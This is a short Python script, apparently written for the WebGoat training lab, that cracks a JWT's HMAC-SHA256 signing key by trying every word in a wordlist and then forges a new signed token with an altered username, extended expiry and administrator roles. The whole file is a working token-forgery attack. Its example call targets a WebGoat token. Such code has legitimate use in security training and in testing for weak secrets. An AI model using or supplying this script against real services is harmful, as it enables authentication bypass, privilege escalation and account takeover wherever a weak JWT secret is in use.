import base64  
import hashlib  
import hmac  
  
def jwt_tokens(jwt_token, json_payload):  
     token = jwt_token.split('.')  
  
     payload = json_payload.encode()  
  
     unsigned_token = (token[0] + '.' + token[1]).encode()  
  
     # signature is base64 URL encoded and padding has been removed, so we must add it  
     signature = (token[2] + '=' * (-len(token[2]) % 4)).encode()  
  
     with open('google-10000-english.txt', 'r') as fd:  
         lines = [line.rstrip('\n').encode() for line in fd]  
  
     def hmac_base64(key, message):  
         return base64.urlsafe_b64encode(bytes.fromhex(hmac.new(key, message, hashlib.sha256).hexdigest()))  
  
     for line in lines:  
         test = hmac_base64(line, unsigned_token)  
  
         if test == signature:  
             print('Key: {}'.format(line.decode()))  
             new_token = (token[0] + '.' + base64.urlsafe_b64encode(payload).decode().rstrip('=')).encode()  
             new_signature = hmac_base64(line, new_token)  
             new_token += ('.' + new_signature.decode().rstrip('=')).encode()  
             print('New token: {}'.format(new_token.decode()))  
             return  

# Ejemplo de Uso  
# jwt_tokens('eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTY0NTQzMzM5MSwiZXhwIjoxNjQ1NDMzNDUxLCJzdWIiOiJ0b21Ad2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQub3JnIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.MqUg_GWyFH4mq-J1nxs36nS97Ee6ahztSwudPB_ui3g','{"iss":"WebGoat Token Builder","aud": "webgoat.org","iat": 1645433391,"exp": 1647433451,"sub": "tom@webgoat.org","username": "WebGoat","Email": "tom@webgoat.org","Role": [ "Manager","Project Administrator" ] }')